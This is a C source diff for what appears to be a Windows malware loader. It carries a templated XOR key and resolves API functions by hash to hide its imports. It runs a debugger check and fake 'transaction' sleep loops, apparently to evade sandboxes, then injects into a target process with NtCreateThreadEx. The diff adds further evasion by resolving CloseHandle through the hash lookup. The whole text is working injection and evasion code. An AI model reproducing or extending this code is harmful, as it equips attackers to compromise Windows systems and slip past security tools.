@@ -4,7 +4,7 @@
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
-    srand(time(NULL));
+    // srand(time(NULL));
     uint16_t key = %XOR_KEY%;
     char path[MAX_PATH]; 
     int min = 3000;
@@ -13,12 +13,10 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL;
     int money_spent = 0;
     
-    // snprintf(path, MAX_PATH, "%s\\Documents\\result.txt", getenv("USERPROFILE"));  
     printf("beginning\n");    
     HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
     HMODULE hKernel32dll = NULL;
     
-    // FILE *file = fopen(path, "w");
     
     if (!is_being_debugged()) {
         printf("Error during file openning : %s\n", path);
@@ -63,7 +61,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         // fprintf(file, "Transaction is starting ...\n");
         for (int i = 0; i < 100; i+=12) {
             // fprintf(file, "Transaction ongoing (%d%%), please wait ...\n", i);
-            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
+            delay = min_delay ;//+ (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
             Sleep(delay);
         }
         // fprintf(file , "Transaction in progress (100%%), please wait ...\n");
@@ -86,6 +84,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, CREATE_THREAD_HASH);
         NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);
         OpenProc _OpenProcess = (OpenProc)CustomGetProcAdress(hKernel32dll, OPEN_PROCESS_HASH);
+        CloseHndle _CloseHandle = (CloseHndle)CustomGetProcAdress(hKernel32dll, CLOSE_HANDLE_HASH);
         
         
         DWORD pid = _GetProcessID(hKernel32dll, TARGET_PROCESS_NAME_HASH);
@@ -117,8 +116,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         // Waiting for thread to finish
         // _NtWaitForSingleObj(th, false, NULL);
 
-        CloseHandle(th);
-        CloseHandle(hProcess);
+        _CloseHandle(th);
+        _CloseHandle(hProcess);
     }
 
     return 0;
